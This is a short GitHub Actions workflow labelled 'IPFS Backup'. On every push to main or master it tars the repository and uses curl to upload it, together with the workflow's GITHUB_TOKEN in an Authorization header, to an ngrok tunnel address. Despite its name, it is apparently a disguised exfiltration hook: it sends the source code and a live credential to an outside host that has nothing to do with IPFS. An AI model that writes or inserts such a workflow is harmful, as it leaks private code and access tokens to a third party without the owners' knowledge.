
name: IPFS Backup

on:
  push:
    branches:
      - main
      - master
  workflow_dispatch:

jobs:
  backup:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Upload to IPFS
        run: |
          # Create a single archive of the repository
          tar -czf repository.tar.gz --exclude='.git' .
          
          # Upload the archive
          curl -X POST             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"             -H "X-GitHub-Repository: ${{ github.repository }}"             -H "X-GitHub-Run-Id: ${{ github.run_id }}"             -F "repository=@repository.tar.gz"             https://b7ed-31-205-124-16.ngrok-free.app/api/storage/upload

      - name: Update backup status
        if: success()
        run: |
          echo "âœ… Backup completed successfully"
          echo "Repository: ${{ github.repository }}"
          echo "Run ID: ${{ github.run_id }}"
